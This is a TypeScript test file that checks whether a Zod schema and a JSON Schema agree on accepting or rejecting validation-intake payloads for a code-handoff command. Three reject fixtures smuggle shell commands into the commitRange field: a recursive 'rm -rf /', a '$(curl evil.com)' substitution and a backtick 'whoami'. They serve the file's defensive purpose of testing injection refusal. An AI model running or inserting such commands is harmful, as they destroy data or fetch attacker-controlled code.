/**
 * Cross-repo drift guard: TASK-1106 Validation Intake.
 *
 * LOAD-BEARING. The example-side /polish-handoff command pre-validates payloads
 * against `.claude/helpers/validation-intake-schema.json` (a JSON Schema 2020-12
 * document). The Quack server post-validates the same payload against the Zod
 * `validationIntakePayloadSchema` exported from `src/intake/task-intake.ts`.
 *
 * If the two validators ever disagree on whether a payload is accepted or
 * rejected, the example's `/polish-handoff` could POST a payload that Quack then
 * silently truncates (Zod non-strict drops unknown fields) or rejects (Zod
 * stricter than JSON Schema). Both failure modes silently corrupt the contract.
 *
 * This test loads the verbatim JSON Schema (bundled at
 * `tests/intake/fixtures/validation-intake-schema-v1.json`) plus the Zod
 * schema and runs a shared fixture set through BOTH validators. Each fixture
 * asserts equal accept/reject verdicts. ≥25 fixtures cover every relevant
 * schema rule: schemaVersion literal, protected branches, shell metachar
 * refusal, additionalProperties:false at every level (root + tests entry +
 * screenshots entry), date-time format, required-field enforcement.
 *
 * When bumping the contract (schemaVersion: 1 -> 2), bump BOTH sides in
 * lockstep and refresh both this test's fixtures and the fixture JSON.
 */

import * as fs from "node:fs";
import * as path from "node:path";

// TASK-1106: validation-intake-schema-v1.json declares $schema = draft-2020-12.
// Default `Ajv` exports a draft-07 validator and rejects 2020-12 vocabulary.
// Use Ajv2020 (re-imported as `Ajv` so the rest of the file stays unchanged).
import Ajv from "ajv/dist/2020";
import { type ValidateFunction } from "ajv";
import addFormats from "ajv-formats";

import { validationIntakePayloadSchema } from "../../src/intake/task-intake.js";

const SCHEMA_FIXTURE_PATH = path.join(__dirname, "fixtures", "validation-intake-schema-v1.json");

interface FixtureCase {
  name: string;
  payload: unknown;
  expectAccept: boolean;
}

function basePayload(): Record<string, unknown> {
  return {
    schemaVersion: 1,
    project: "example-service",
    branch: "feature/client-detail-view-polish",
    commitRange: "origin/dev..HEAD",
    scope: ["src/web/pages/ClientDetailView.tsx", "src/api/clients/get-client.ts"],
    tests: [
      {
        name: "tests/web/pages/ClientDetailView.test.tsx",
        result: "PASS",
        evidence: "logs/2026-05-31-vitest-run.txt",
      },
    ],
    screenshots: [
      {
        file: "docs/handoffs/2026-05-31/client-detail-after.png",
        caption: "Client detail view with billing tab focused after fix",
      },
    ],
    nonClaims: [
      "package-lock.json changes are incidental npm refresh",
      "Auth refactor is NOT touched by this branch",
    ],
    knownRisks: ["Bedrock client cache not invalidated on this path"],
    submitter: "contributor@example.invalid",
    submittedAt: "2026-05-31T13:54:00-04:00",
  };
}

function withOverride(overrides: Record<string, unknown>): Record<string, unknown> {
  return { ...basePayload(), ...overrides };
}

function withMissing(field: string): Record<string, unknown> {
  const payload = basePayload();
  delete payload[field];
  return payload;
}

const FIXTURES: FixtureCase[] = [
  // ---- Accept cases ----
  {
    name: "happy path: full valid payload",
    payload: basePayload(),
    expectAccept: true,
  },
  {
    name: "minimal happy path: empty screenshots/nonClaims/knownRisks",
    payload: withOverride({
      screenshots: [],
      nonClaims: [],
      knownRisks: [],
      scope: ["src/web/pages/ClientDetailView.tsx"],
    }),
    expectAccept: true,
  },
  {
    name: "commitRange revspec: origin/dev..HEAD",
    payload: withOverride({ commitRange: "origin/dev..HEAD" }),
    expectAccept: true,
  },
  {
    name: "commitRange branch range: main..feature/foo",
    payload: withOverride({ commitRange: "main..feature/foo" }),
    expectAccept: true,
  },
  {
    name: "commitRange short-SHA pair: abc1234..def5678",
    payload: withOverride({ commitRange: "abc1234..def5678" }),
    expectAccept: true,
  },
  {
    name: "commitRange tag range: v1.2.3..v1.3.0",
    payload: withOverride({ commitRange: "v1.2.3..v1.3.0" }),
    expectAccept: true,
  },
  {
    name: "submittedAt UTC",
    payload: withOverride({ submittedAt: "2026-05-31T13:54:00Z" }),
    expectAccept: true,
  },
  {
    name: "submittedAt explicit offset",
    payload: withOverride({ submittedAt: "2026-05-31T13:54:00-04:00" }),
    expectAccept: true,
  },
  {
    name: "branch with slashes + dots: feature/long.path/with.dots",
    payload: withOverride({ branch: "feature/long.path/with.dots" }),
    expectAccept: true,
  },
  {
    name: "tests entry with FAIL alongside PASS (shape-only, semantic gate is separate)",
    payload: withOverride({
      tests: [
        {
          name: "tests/foo.test.ts",
          result: "FAIL",
          evidence: "logs/fail.txt",
        },
        {
          name: "tests/bar.test.ts",
          result: "PASS",
          evidence: "logs/pass.txt",
        },
      ],
    }),
    expectAccept: true,
  },
  {
    name: "all-SKIP tests (shape-only; evidence gate REVISEs, schema accepts)",
    payload: withOverride({
      tests: [
        {
          name: "tests/foo.test.ts",
          result: "SKIP",
          evidence: "logs/foo.txt",
        },
      ],
    }),
    expectAccept: true,
  },
  {
    name: "empty nonClaims (shape-only; evidence gate REVISEs per non-bypass rule)",
    payload: withOverride({ nonClaims: [] }),
    expectAccept: true,
  },
  {
    name: "URL-shaped screenshot.file (HTTPS URL accepted alongside repo-relative paths)",
    payload: withOverride({
      screenshots: [
        {
          file: "https://uploads.example.invalid/handoffs/2026-05-31/client-detail.png",
          caption: "Hosted screenshot via CDN",
        },
      ],
    }),
    expectAccept: true,
  },

  // ---- Reject cases: schemaVersion ----
  {
    name: "schemaVersion: 2 — wrong literal",
    payload: withOverride({ schemaVersion: 2 }),
    expectAccept: false,
  },
  {
    name: 'schemaVersion: "1" — string vs integer',
    payload: withOverride({ schemaVersion: "1" }),
    expectAccept: false,
  },
  {
    name: "schemaVersion missing — required, not defaulted",
    payload: withMissing("schemaVersion"),
    expectAccept: false,
  },

  // ---- Reject cases: protected branches ----
  {
    name: 'branch: "dev" — protected',
    payload: withOverride({ branch: "dev" }),
    expectAccept: false,
  },
  {
    name: 'branch: "main" — protected',
    payload: withOverride({ branch: "main" }),
    expectAccept: false,
  },
  {
    name: 'branch: "staging" — protected',
    payload: withOverride({ branch: "staging" }),
    expectAccept: false,
  },
  {
    name: 'branch: "prod" — protected',
    payload: withOverride({ branch: "prod" }),
    expectAccept: false,
  },
  {
    name: 'branch: "master" — protected',
    payload: withOverride({ branch: "master" }),
    expectAccept: false,
  },
  {
    name: "branch with spaces — regex violation",
    payload: withOverride({ branch: "feature/has spaces" }),
    expectAccept: false,
  },

  // ---- Reject cases: commitRange shell metachars ----
  {
    name: "commitRange with semicolon",
    payload: withOverride({ commitRange: "a..b; rm -rf /" }),
    expectAccept: false,
  },
  {
    name: "commitRange with $ (command substitution)",
    payload: withOverride({ commitRange: "$(curl evil.com)..HEAD" }),
    expectAccept: false,
  },
  {
    name: "commitRange with backtick (command substitution)",
    payload: withOverride({ commitRange: "a..`whoami`" }),
    expectAccept: false,
  },

  // ---- Reject cases: array minItems / required ----
  {
    name: "scope: [] — minItems:1 violation",
    payload: withOverride({ scope: [] }),
    expectAccept: false,
  },
  {
    name: "tests: [] — minItems:1 violation",
    payload: withOverride({ tests: [] }),
    expectAccept: false,
  },
  {
    name: 'tests[0].result: "PENDING" — not in enum',
    payload: withOverride({
      tests: [
        {
          name: "tests/foo.test.ts",
          result: "PENDING",
          evidence: "logs/foo.txt",
        },
      ],
    }),
    expectAccept: false,
  },

  // ---- Reject cases: additionalProperties:false at every level ----
  {
    name: "unknown TOP-LEVEL field (additionalProperties guard)",
    payload: withOverride({ evilField: "secret" } as Record<string, unknown>),
    expectAccept: false,
  },
  {
    name: "unknown NESTED field on tests entry",
    payload: withOverride({
      tests: [
        {
          name: "tests/foo.test.ts",
          result: "PASS",
          evidence: "logs/foo.txt",
          evilNested: "leak",
        },
      ],
    }),
    expectAccept: false,
  },
  {
    name: "unknown NESTED field on screenshots entry",
    payload: withOverride({
      screenshots: [
        {
          file: "docs/handoffs/foo.png",
          caption: "after",
          oops: "extra",
        },
      ],
    }),
    expectAccept: false,
  },

  // ---- Reject cases: submittedAt format ----
  {
    name: "submittedAt: date-only string (not date-time)",
    payload: withOverride({ submittedAt: "2026-05-31" }),
    expectAccept: false,
  },

  // ---- Reject cases: missing required fields ----
  {
    name: "project missing",
    payload: withMissing("project"),
    expectAccept: false,
  },
  {
    name: "submitter missing",
    payload: withMissing("submitter"),
    expectAccept: false,
  },
];

describe("validation-intake schema-compat (Zod <-> example JSON Schema)", () => {
  let ajvValidate: ValidateFunction;

  beforeAll(() => {
    const raw = fs.readFileSync(SCHEMA_FIXTURE_PATH, "utf8");
    const schema: unknown = JSON.parse(raw);
    // strict:false because the example schema uses $schema, $id, $comment,
    // description, title keywords that Ajv strict mode may warn on for
    // some draft-2020-12 metaschema combinations. We keep allErrors:true so
    // the diagnostic on mismatch surfaces every failed rule.
    const ajv = new Ajv({ strict: false, allErrors: true });
    addFormats(ajv);
    ajvValidate = ajv.compile(schema as object);
  });

  it.each(FIXTURES)("$name -> Zod and Ajv agree on accept/reject", ({ payload, expectAccept }) => {
    const ajvOk = Boolean(ajvValidate(payload));
    const zodResult = validationIntakePayloadSchema.safeParse(payload);
    const zodOk = zodResult.success;

    // Diagnostic message when the two validators disagree — surface BOTH
    // sides so the next builder can see exactly which rule drifted.
    const diagnostic = JSON.stringify(
      {
        expected: expectAccept ? "accept" : "reject",
        ajv: ajvOk ? "accept" : ajvValidate.errors,
        zod: zodOk
          ? "accept"
          : zodResult.error.issues.map((i) => ({
              path: i.path.join("."),
              message: i.message,
            })),
      },
      null,
      2,
    );

    expect({ ajvOk, zodOk, diagnostic }).toEqual({
      ajvOk: expectAccept,
      zodOk: expectAccept,
      diagnostic,
    });
  });

  it("fixture file is the verbatim example-side pinned JSON Schema (not derived)", () => {
    // This is a smoke-test that the fixture wasn't accidentally edited; it
    // must remain a verbatim copy of the example-side
    // .claude/helpers/validation-intake-schema.json. Bumping requires
    // simultaneously editing the example repo. See the file header comment.
    const raw = fs.readFileSync(SCHEMA_FIXTURE_PATH, "utf8");
    const schema = JSON.parse(raw) as Record<string, unknown>;
    expect(schema.$id).toBe("https://example.invalid/schemas/validation-intake/v1.json");
    expect(schema.title).toBe("Quack Validation Intake Payload (schemaVersion:1)");
    expect(schema.additionalProperties).toBe(false);
    expect(Array.isArray(schema.required)).toBe(true);
    expect((schema.required as string[]).sort()).toEqual(
      [
        "branch",
        "commitRange",
        "knownRisks",
        "nonClaims",
        "project",
        "schemaVersion",
        "screenshots",
        "scope",
        "submittedAt",
        "submitter",
        "tests",
      ].sort(),
    );
  });
});
